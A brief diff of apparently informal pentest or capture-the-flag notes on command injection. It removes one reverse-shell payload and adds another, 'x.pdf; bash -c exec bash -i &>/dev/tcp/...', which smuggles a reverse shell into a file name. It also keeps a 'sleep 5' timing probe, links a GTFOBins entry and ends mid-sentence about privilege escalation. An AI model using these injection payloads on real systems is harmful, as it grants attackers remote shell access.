@@ -1,2 +1,8 @@
-x; bash -c 'bash -i >& /dev/tcp/localhost/4444 0>&1' #
+Root acces: the idea is that they spawn a reverse shell through export
+https://gtfobins.org/gtfobins/bash/#reverse-shell
+
+This can be achieved with these commands:
+x.pdf; bash -c 'exec bash -i &>/dev/tcp/localhost.com/12345 <&1'
 x; sleep 5 #
+
+Now that they have a shell we just need to figure out how they escalata
